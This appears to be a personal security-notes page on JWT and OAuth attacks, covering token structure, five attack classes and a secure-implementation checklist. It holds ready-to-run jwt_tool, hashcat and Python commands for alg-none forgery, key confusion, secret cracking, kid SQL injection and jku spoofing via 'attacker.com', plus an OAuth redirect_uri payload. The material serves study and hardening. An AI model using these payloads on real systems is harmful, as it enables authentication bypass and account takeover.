---
type: monograph
room: yellow
subject: "JWT & Authentication Attacks"
tags: [yellow/appsec, yellow/auth, yellow/jwt]
date_updated: {{date}}
---

# AppSec — JWT & Authentication Attacks

> [!quote]
> *"There is nothing more deceptive than an obvious fact."* — A tampered token looks legitimate.

**MITRE:** T1078 (Valid Accounts), T1606 (Forge Web Credentials) | **OWASP:** A07 Auth Failures

JSON Web Tokens are the most common authentication mechanism in modern web apps — and one of the most frequently misconfigured. This monograph covers attack techniques and secure implementation.

---

## JWT Structure

```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9   ← Header (base64url)
.eyJzdWIiOiIxMjM0IiwicGxlYXNlIjoibm8ifQ== ← Payload (base64url)
.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c   ← Signature
```

```bash
# Decode a JWT (no verification)
echo "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9" | base64 -d
# Or:
python3 -c "import base64,sys; [print(base64.b64decode(p+'==').decode()) for p in sys.argv[1].split('.')]" "<token>"
```

---

## Attack 1: Algorithm None (CVE-2015-9235)

Some libraries accept `alg: none` — stripping the signature entirely.

```bash
# jwt_tool
python3 jwt_tool.py <token> -X a

# Manual
# 1. Decode header: {"alg":"HS256","typ":"JWT"}
# 2. Change to:     {"alg":"none","typ":"JWT"}
# 3. Encode header + modified payload
# 4. Append empty signature: header.payload.
python3 -c "
import base64, json
header = base64.b64encode(b'{\"alg\":\"none\",\"typ\":\"JWT\"}').rstrip(b'=').decode()
payload = base64.b64encode(b'{\"sub\":\"admin\",\"role\":\"admin\"}').rstrip(b'=').decode()
print(f'{header}.{payload}.')
"
```

---

## Attack 2: Algorithm Confusion (RS256 → HS256)

When the server uses RS256 (asymmetric), the **public key** is available. Trick the server into verifying with HMAC using the public key as the secret.

```bash
# jwt_tool — key confusion
python3 jwt_tool.py <token> -X k -pk public.pem

# Manual steps:
# 1. Download server's public key (often at /api/jwks.json or /.well-known/jwks.json)
# 2. Convert PEM to a single line
# 3. Create new JWT signed with HS256 using the public key bytes as the HMAC secret
```

---

## Attack 3: Weak Secret (HS256 Brute Force)

```bash
# hashcat — GPU-accelerated JWT crack
hashcat -a 0 -m 16500 <jwt_token> /usr/share/wordlists/rockyou.txt

# jwt_tool — dictionary attack
python3 jwt_tool.py <token> -C -d /usr/share/wordlists/rockyou.txt

# john — CPU-based
john --wordlist=/usr/share/wordlists/rockyou.txt --format=HMAC-SHA256 jwt.hash
```

---

## Attack 4: JWT Header Injection (jwk / jku / kid)

```bash
# kid (Key ID) — SQL injection
# If kid is used to fetch key from DB:
# kid": "' UNION SELECT 'attacker_secret' -- -"
python3 jwt_tool.py <token> -I -hc kid -hv "' UNION SELECT 'secret'-- -" -S hs256 -p "secret"

# jku — point to attacker-controlled JWKS
python3 jwt_tool.py <token> -X s -ju "https://attacker.com/jwks.json"

# jwk injection — embed attacker's public key in header
python3 jwt_tool.py <token> -X n
```

---

## Attack 5: Token Replay & Session Theft

```bash
# Intercept a valid JWT (Burp, network sniff, log files, localStorage)
# Reuse it until it expires — no invalidation check on server

# Check for sensitive data in payload
echo "<payload_part>" | base64 -d  # look for PII, roles, user IDs

# Test token on different endpoints to find privilege escalation paths
```

---

## jwt_tool — Full Reference

```bash
# Install
git clone https://github.com/ticarpi/jwt_tool
pip3 install -r requirements.txt

# Decode and analyse
python3 jwt_tool.py <token>

# Tamper mode (interactive)
python3 jwt_tool.py <token> -T

# Crack HS256 secret
python3 jwt_tool.py <token> -C -d wordlist.txt

# Attack: algorithm none
python3 jwt_tool.py <token> -X a

# Attack: key confusion (RS256→HS256)
python3 jwt_tool.py <token> -X k -pk server_public.pem

# Attack: jku spoofing
python3 jwt_tool.py <token> -X s -ju https://attacker.com/jwks.json

# Attack: jwk inject
python3 jwt_tool.py <token> -X n

# Attack: kid SQLi
python3 jwt_tool.py <token> -I -hc kid -hv "' UNION SELECT 'secret'-- -" -S hs256 -p "secret"

# Verify token against known secret
python3 jwt_tool.py <token> -S hs256 -p "password123"

# Scan all known vulnerabilities
python3 jwt_tool.py <token> -ru https://target.com/api/protected -M pb
```

---

## Secure JWT Implementation

```markdown
### Algorithm
☐ Use RS256 or ES256 (asymmetric) for APIs — secret is never shared
☐ Explicitly reject `none` algorithm server-side
☐ If HS256, use a secret of ≥256 bits (32 bytes) from a CSPRNG

### Claims
☐ `exp` (expiry): access tokens ≤15 minutes, refresh tokens ≤7 days
☐ `iat` (issued at): always set for token age enforcement
☐ `aud` (audience): set and validate — prevents token reuse across services
☐ `iss` (issuer): set and validate

### Key Management
☐ Private key stored in secrets manager (not source code)
☐ Keys rotated on schedule — old tokens gracefully rejected after rotation
☐ JWKS endpoint serves only the public key — never private

### Server-Side Validation
☐ Always validate signature before trusting claims
☐ Validate `exp`, `nbf`, `iss`, `aud` on every request
☐ Maintain a token revocation list or use short-lived tokens + refresh flow
☐ Log failed validation attempts (wrong sig, expired, wrong aud)

### Transport
☐ Transmit via Authorization: Bearer header — not URL parameters
☐ Store in memory (SPA) or HttpOnly cookie — not localStorage (XSS-accessible)
```

---

## OAuth 2.0 Common Flaws

```bash
# Open redirect — redirect_uri not validated
https://target.com/oauth/authorize?client_id=x&redirect_uri=https://attacker.com&response_type=code

# State parameter missing — CSRF attack on auth flow
# Attacker initiates auth flow, captures URL before redirect, tricks victim into clicking

# PKCE bypass — some servers don't enforce PKCE
# Code interception if redirect_uri partially matched

# Scope escalation
# Modify scope= parameter to request more permissions than intended
```

---

## Related Notes

- [[AppSec - OWASP Top 10]] ← A07 Authentication Failures
- [[AppSec - Secure Code Review]] ← Code-level auth checks
- [[Yellow - Instruments]] ← jwt_tool, hashcat commands

↩ [[Yellow - Monographs]] · [[Yellow]] · [[Mind Palace]]
